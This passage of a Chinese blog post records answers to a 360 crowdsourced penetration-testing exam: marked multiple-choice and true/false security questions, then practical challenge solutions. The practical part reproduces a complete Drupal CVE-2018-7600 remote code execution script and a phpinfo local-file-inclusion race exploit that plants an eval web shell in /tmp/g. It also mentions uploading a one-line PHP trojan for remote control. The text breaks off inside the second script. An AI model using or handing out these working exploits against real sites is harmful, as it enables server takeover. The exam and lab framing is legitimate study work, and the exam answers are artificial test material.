</ul>
<h5 id="4、身份鉴别的安全要求中，需要采用双因素认证，以下不属于双因素认证的是？：（）"><a href="#4、身份鉴别的安全要求中，需要采用双因素认证，以下不属于双因素认证的是？：（）" class="headerlink" title="4、身份鉴别的安全要求中，需要采用双因素认证，以下不属于双因素认证的是？：（）"></a>4、身份鉴别的安全要求中，需要采用双因素认证，以下不属于双因素认证的是？：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、登陆服务器需要通过堡垒机</li>
<li><input disabled="" type="checkbox"> B、魔兽世界登录时输入动态密保</li>
<li><input checked="" disabled="" type="checkbox"> C、网页登陆时需要输入图形验证码</li>
<li><input disabled="" type="checkbox"> D、保险柜需要钥匙和指纹都匹配才能解锁</li>
</ul>
<h5 id="5、MSF的模块存放位置是哪个文件夹？：（）"><a href="#5、MSF的模块存放位置是哪个文件夹？：（）" class="headerlink" title="5、MSF的模块存放位置是哪个文件夹？：（）"></a>5、MSF的模块存放位置是哪个文件夹？：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、app</li>
<li><input disabled="" type="checkbox"> B、data</li>
<li><input disabled="" type="checkbox"> C、lib</li>
<li><input checked="" disabled="" type="checkbox"> D、modules</li>
</ul>
<h5 id="6、以串联方式接入企业互联网出口的硬件防火墙，没有以下哪个功能：（）"><a href="#6、以串联方式接入企业互联网出口的硬件防火墙，没有以下哪个功能：（）" class="headerlink" title="6、以串联方式接入企业互联网出口的硬件防火墙，没有以下哪个功能：（）"></a>6、以串联方式接入企业互联网出口的硬件防火墙，没有以下哪个功能：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、对网站前台上传的webshell进行拦截</li>
<li><input checked="" disabled="" type="checkbox"> B、发现企业内网中的SQL注入行为</li>
<li><input disabled="" type="checkbox"> C、阻止黑客对网站后台进行密码爆破</li>
<li><input disabled="" type="checkbox"> D、发现境外势力使用AWVS 对 OA 系统进行扫描</li>
</ul>
<h5 id="7、收集信息而不希望目标发现，应使用哪个工具？：（）"><a href="#7、收集信息而不希望目标发现，应使用哪个工具？：（）" class="headerlink" title="7、收集信息而不希望目标发现，应使用哪个工具？：（）"></a>7、收集信息而不希望目标发现，应使用哪个工具？：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、nmap</li>
<li><input checked="" disabled="" type="checkbox"> B、p0f</li>
<li><input disabled="" type="checkbox"> C、xprobe2</li>
<li><input disabled="" type="checkbox"> D、tcptraceroute</li>
</ul>
<h5 id="8、攻击者提交请求-http-www-360-cn-displaynews-asp-id-772-39-，网站反馈信息为Microsoft-OLE-DB-Provider-for-ODBC-Drivers错误‘80040e14’，能够说明该网站后端采用的数据库是哪个？：（）"><a href="#8、攻击者提交请求-http-www-360-cn-displaynews-asp-id-772-39-，网站反馈信息为Microsoft-OLE-DB-Provider-for-ODBC-Drivers错误‘80040e14’，能够说明该网站后端采用的数据库是哪个？：（）" class="headerlink" title="8、攻击者提交请求 http://www.360.cn/displaynews.asp?id=772&#39;，网站反馈信息为Microsoft OLE DB Provider for ODBC Drivers错误‘80040e14’，能够说明该网站后端采用的数据库是哪个？：（）"></a>8、攻击者提交请求 <a href="http://www.360.cn/displaynews.asp?id=772&#39;，网站反馈信息为Microsoft" target="_blank" rel="noopener">http://www.360.cn/displaynews.asp?id=772&#39;，网站反馈信息为Microsoft</a> OLE DB Provider for ODBC Drivers错误‘80040e14’，能够说明该网站后端采用的数据库是哪个？：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、mysql</li>
<li><input disabled="" type="checkbox"> B、Access</li>
<li><input disabled="" type="checkbox"> C、Orade</li>
<li><input checked="" disabled="" type="checkbox"> D、mssql</li>
</ul>
<h5 id="9、以下哪个选项，nmap会检测操作系统类型-：（）"><a href="#9、以下哪个选项，nmap会检测操作系统类型-：（）" class="headerlink" title="9、以下哪个选项，nmap会检测操作系统类型?：（）"></a>9、以下哪个选项，nmap会检测操作系统类型?：（）</h5><ul>
<li><input checked="" disabled="" type="checkbox"> A、-o</li>
<li><input disabled="" type="checkbox"> B、-v</li>
<li><input disabled="" type="checkbox"> C、-Sv</li>
<li><input disabled="" type="checkbox"> D、-Pn</li>
</ul>
<h5 id="10、对Linux服务器上-drwxr-xr-x-2-root-root-4096-Jun-21-2018-ssl-以下选项正确的是：（）"><a href="#10、对Linux服务器上-drwxr-xr-x-2-root-root-4096-Jun-21-2018-ssl-以下选项正确的是：（）" class="headerlink" title="10、对Linux服务器上 drwxr-xr-x 2 root root 4096 Jun 21 2018 ssl 以下选项正确的是：（）"></a>10、对Linux服务器上 drwxr-xr-x 2 root root 4096 Jun 21 2018 ssl 以下选项正确的是：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、该文件夹权限为655</li>
<li><input checked="" disabled="" type="checkbox"> B、这个文件夹中有两个文件</li>
<li><input disabled="" type="checkbox"> C、其他用户不能进入该文件夹</li>
<li><input disabled="" type="checkbox"> D、root用户组的用户对这个文件夹有全部权限</li>
</ul>
<h4 id="客观题-多选题"><a href="#客观题-多选题" class="headerlink" title="客观题-多选题"></a>客观题-多选题</h4><h5 id="1、以下哪些是WEB攻击方式：（）"><a href="#1、以下哪些是WEB攻击方式：（）" class="headerlink" title="1、以下哪些是WEB攻击方式：（）"></a>1、以下哪些是WEB攻击方式：（）</h5><ul>
<li><input checked="" disabled="" type="checkbox"> A、SQL注入</li>
<li><input checked="" disabled="" type="checkbox"> B、Cookie欺骗</li>
<li><input checked="" disabled="" type="checkbox"> C、CSRF</li>
<li><input checked="" disabled="" type="checkbox"> D、可执行脚本文件上传</li>
</ul>
<h5 id="2、下列不是Access创建的数据库文件后缀名有：（）"><a href="#2、下列不是Access创建的数据库文件后缀名有：（）" class="headerlink" title="2、下列不是Access创建的数据库文件后缀名有：（）"></a>2、下列不是Access创建的数据库文件后缀名有：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、.mdb</li>
<li><input checked="" disabled="" type="checkbox"> B、.MYD</li>
<li><input disabled="" type="checkbox"> C、.accdb</li>
<li><input checked="" disabled="" type="checkbox"> D、.sql</li>
</ul>
<h5 id="3、以下说法正确的有：（）"><a href="#3、以下说法正确的有：（）" class="headerlink" title="3、以下说法正确的有：（）"></a>3、以下说法正确的有：（）</h5><ul>
<li><input checked="" disabled="" type="checkbox"> A、病毒属于恶意代码</li>
<li><input disabled="" type="checkbox"> B、蠕虫不属于恶意代码</li>
<li><input checked="" disabled="" type="checkbox"> C、木马属于恶意代码</li>
<li><input disabled="" type="checkbox"> D、后门不属于恶意代码</li>
</ul>
<h5 id="4、御剑扫描器可以帮助我们发现以下哪些安全威胁：（）"><a href="#4、御剑扫描器可以帮助我们发现以下哪些安全威胁：（）" class="headerlink" title="4、御剑扫描器可以帮助我们发现以下哪些安全威胁：（）"></a>4、御剑扫描器可以帮助我们发现以下哪些安全威胁：（）</h5><ul>
<li><input checked="" disabled="" type="checkbox"> A、网站二级目录下的备份文件</li>
<li><input checked="" disabled="" type="checkbox"> B、网站编辑器fckeditor的目录</li>
<li><input disabled="" type="checkbox"> C、未及时安装补丁的Windows服务器</li>
<li><input checked="" disabled="" type="checkbox"> D、以前被黑客攻击留下的php木马</li>
</ul>
<h5 id="5、基于UDP协议的有：（）"><a href="#5、基于UDP协议的有：（）" class="headerlink" title="5、基于UDP协议的有：（）"></a>5、基于UDP协议的有：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、SNMP</li>
<li><input checked="" disabled="" type="checkbox"> B、Rlogin</li>
<li><input disabled="" type="checkbox"> C、POP3</li>
<li><input checked="" disabled="" type="checkbox"> D、DNS</li>
</ul>
<h4 id="判断题"><a href="#判断题" class="headerlink" title="判断题"></a>判断题</h4><h5 id="1、Windows系统中，只要可登录的用户，都可以创建新用户，并包括用户的名称与密码、用户所属的组等信息。"><a href="#1、Windows系统中，只要可登录的用户，都可以创建新用户，并包括用户的名称与密码、用户所属的组等信息。" class="headerlink" title="1、Windows系统中，只要可登录的用户，都可以创建新用户，并包括用户的名称与密码、用户所属的组等信息。"></a>1、Windows系统中，只要可登录的用户，都可以创建新用户，并包括用户的名称与密码、用户所属的组等信息。</h5><ul>
<li><input disabled="" type="checkbox"> 正确</li>
<li><input checked="" disabled="" type="checkbox"> 错误</li>
</ul>
<h5 id="2、chmod命令是Windows修改文件权限的命令。"><a href="#2、chmod命令是Windows修改文件权限的命令。" class="headerlink" title="2、chmod命令是Windows修改文件权限的命令。"></a>2、chmod命令是Windows修改文件权限的命令。</h5><ul>
<li><input disabled="" type="checkbox"> 正确</li>
<li><input checked="" disabled="" type="checkbox"> 错误</li>
</ul>
<h5 id="3、Kali数字取证操作系统是一款收费系统。"><a href="#3、Kali数字取证操作系统是一款收费系统。" class="headerlink" title="3、Kali数字取证操作系统是一款收费系统。"></a>3、Kali数字取证操作系统是一款收费系统。</h5><ul>
<li><input disabled="" type="checkbox"> 正确</li>
<li><input checked="" disabled="" type="checkbox"> 错误</li>
</ul>
<h5 id="4、Web应用程序中保存上传文件的目录应授予脚本执行权限。"><a href="#4、Web应用程序中保存上传文件的目录应授予脚本执行权限。" class="headerlink" title="4、Web应用程序中保存上传文件的目录应授予脚本执行权限。"></a>4、Web应用程序中保存上传文件的目录应授予脚本执行权限。</h5><ul>
<li><input disabled="" type="checkbox"> 正确</li>
<li><input checked="" disabled="" type="checkbox"> 错误</li>
</ul>
<h5 id="5、SQL注入漏洞不会对业务系统的账号密码产生影响。"><a href="#5、SQL注入漏洞不会对业务系统的账号密码产生影响。" class="headerlink" title="5、SQL注入漏洞不会对业务系统的账号密码产生影响。"></a>5、SQL注入漏洞不会对业务系统的账号密码产生影响。</h5><ul>
<li><input disabled="" type="checkbox"> 正确</li>
<li><input checked="" disabled="" type="checkbox"> 错误</li>
</ul>
<h4 id="实战题"><a href="#实战题" class="headerlink" title="实战题"></a>实战题</h4><h5 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415204118642.png" alt="image-20200415204118642"></p>
<p>修改方法为POST进行传输</p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415204229002.png" alt="image-20200415204229002"></p>
<p>原题地址：<a href="https://www.jianshu.com/p/973b430a238c" target="_blank" rel="noopener">https://www.jianshu.com/p/973b430a238c</a></p>
<h5 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415204316500.png" alt="image-20200415204316500"></p>
<p>Struts2 直接用工具</p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415204423879.png" alt="image-20200415204423879"></p>
<p>原题地址：<a href="https://www.jianshu.com/p/973b430a238c" target="_blank" rel="noopener">https://www.jianshu.com/p/973b430a238c</a></p>
<h5 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415204841529.png" alt="image-20200415204841529"></p>
<p>文件上传直接上传一句话木马进行菜刀连接</p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415205259798.png" alt="image-20200415205259798"></p>
<p>原题地址：<a href="https://blog.csdn.net/qq_42357070/article/details/82383535" target="_blank" rel="noopener">https://blog.csdn.net/qq_42357070/article/details/82383535</a></p>
<h5 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415205412032.png" alt="image-20200415205412032"></p>
<p>当时没做出来…</p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200417164319209.png" alt="image-20200417164319209"></p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200417164338990.png" alt="image-20200417164338990"></p>
<p>Samba远程命令执行漏洞（CVE-2017-7494）：<a href="https://www.jianshu.com/p/24c7494971a8" target="_blank" rel="noopener">https://www.jianshu.com/p/24c7494971a8</a></p>
<h5 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415205625769.png" alt="image-20200415205625769"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">POC:</span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line"><span class="keyword">from</span> bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">def get_args():</span><br><span class="line">  parser = argparse.ArgumentParser( <span class="attribute">prog</span>=<span class="string">"drupa7-CVE-2018-7600.py"</span>,</span><br><span class="line">                    <span class="attribute">formatter_class</span>=lambda prog: argparse.HelpFormatter(prog,<span class="attribute">max_help_position</span>=50),</span><br><span class="line">                    epilog= <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">                    This script will exploit the (CVE-2018-7600) vulnerability in Drupal 7 &lt;= 7.57</span></span><br><span class="line"><span class="string">                    by poisoning the recover password form (user/password) and triggering it with</span></span><br><span class="line"><span class="string">                    the upload file via ajax (/file/ajax).</span></span><br><span class="line"><span class="string">                    '</span><span class="string">''</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"target"</span>, <span class="attribute">help</span>=<span class="string">"URL of target Drupal site (ex: http://target.com/)"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"-c"</span>, <span class="string">"--command"</span>, <span class="attribute">default</span>=<span class="string">"id"</span>, <span class="attribute">help</span>=<span class="string">"Command to execute (default = id)"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"-f"</span>, <span class="string">"--function"</span>, <span class="attribute">default</span>=<span class="string">"passthru"</span>, <span class="attribute">help</span>=<span class="string">"Function to use as attack vector (default = passthru)"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"-p"</span>, <span class="string">"--proxy"</span>, <span class="attribute">default</span>=<span class="string">""</span>, <span class="attribute">help</span>=<span class="string">"Configure a proxy in the format http://127.0.0.1:8080/ (default = none)"</span>)</span><br><span class="line">  args = parser.parse_args()</span><br><span class="line">  return args</span><br><span class="line"></span><br><span class="line">def pwn_target(target, function, command, proxy):</span><br><span class="line">  requests.packages.urllib3.disable_warnings()</span><br><span class="line">  proxies = &#123;<span class="string">'http'</span>: proxy, <span class="string">'https'</span>: proxy&#125;</span><br><span class="line">  <span class="builtin-name">print</span>(<span class="string">'[*] Poisoning a form and including it in cache.'</span>)</span><br><span class="line">  get_params = &#123;<span class="string">'q'</span>:<span class="string">'user/password'</span>, <span class="string">'name[#post_render][]'</span>:function, <span class="string">'name[#type]'</span>:<span class="string">'markup'</span>, <span class="string">'name[#markup]'</span>: command&#125;</span><br><span class="line">  post_params = &#123;<span class="string">'form_id'</span>:<span class="string">'user_pass'</span>, <span class="string">'_triggering_element_name'</span>:<span class="string">'name'</span>, <span class="string">'_triggering_element_value'</span>:<span class="string">''</span>, <span class="string">'opz'</span>:<span class="string">'E-mail new Password'</span>&#125;</span><br><span class="line">  r = requests.post(target, <span class="attribute">params</span>=get_params, <span class="attribute">data</span>=post_params, <span class="attribute">verify</span>=<span class="literal">False</span>, <span class="attribute">proxies</span>=proxies)</span><br><span class="line">  soup = BeautifulSoup(r.text, <span class="string">"html.parser"</span>)</span><br><span class="line">  try:</span><br><span class="line">    form = soup.<span class="builtin-name">find</span>(<span class="string">'form'</span>, &#123;<span class="string">'id'</span>: <span class="string">'user-pass'</span>&#125;)</span><br><span class="line">    form_build_id = form.<span class="builtin-name">find</span>(<span class="string">'input'</span>, &#123;<span class="string">'name'</span>: <span class="string">'form_build_id'</span>&#125;).<span class="builtin-name">get</span>(<span class="string">'value'</span>)</span><br><span class="line">    <span class="keyword">if</span> form_build_id:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">'[*] Poisoned form ID: '</span> + form_build_id)</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">'[*] Triggering exploit to execute: '</span> + command)</span><br><span class="line">        get_params = &#123;<span class="string">'q'</span>:<span class="string">'file/ajax/name/#value/'</span> + form_build_id&#125;</span><br><span class="line">        post_params = &#123;<span class="string">'form_build_id'</span>:form_build_id&#125;</span><br><span class="line">        r = requests.post(target, <span class="attribute">params</span>=get_params, <span class="attribute">data</span>=post_params, <span class="attribute">verify</span>=<span class="literal">False</span>, <span class="attribute">proxies</span>=proxies)</span><br><span class="line">        parsed_result = r.text.split(<span class="string">'[&#123;"command":"settings"'</span>)[0]</span><br><span class="line">        <span class="builtin-name">print</span>(parsed_result)</span><br><span class="line">  except:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"ERROR: Something went wrong."</span>)</span><br><span class="line">    raise</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">  <span class="builtin-name">print</span> ()</span><br><span class="line">  <span class="builtin-name">print</span> (<span class="string">'============================================================================='</span>)</span><br><span class="line">  <span class="builtin-name">print</span> (<span class="string">'|          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |'</span>)</span><br><span class="line">  <span class="builtin-name">print</span> (<span class="string">'|                              by pimps                                     |'</span>)</span><br><span class="line">  <span class="builtin-name">print</span> (<span class="string">'=============================================================================\n'</span>)</span><br><span class="line"></span><br><span class="line">  args = get_args() # <span class="builtin-name">get</span> the cl args</span><br><span class="line">  pwn_target(args.target.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>

<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415205746961.png" alt="image-20200415205746961"></p>
<h5 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415205810082.png" alt="image-20200415205810082"></p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415205827356.png" alt="image-20200415205827356"></p>
<p>提示：php文件包含</p>
<p>发现 <a href="http://www.zip源码" target="_blank" rel="noopener">www.zip源码</a></p>
<p>下载发现lfi.php文件</p>
<p>php文件包含漏洞（利用phpinfo）</p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415210025732.png" alt="image-20200415210025732"></p>
<p>GitHub：<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">EXP:</span><br><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">"""POST /phpinfo.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"\nGot it! Shell created in /tmp/g"</span></span><br><span class="line">                    self.event.set()</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"LFI With PHPInfo()"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-="</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Getting initial offset..."</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Spawning worker pool (%d)..."</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span 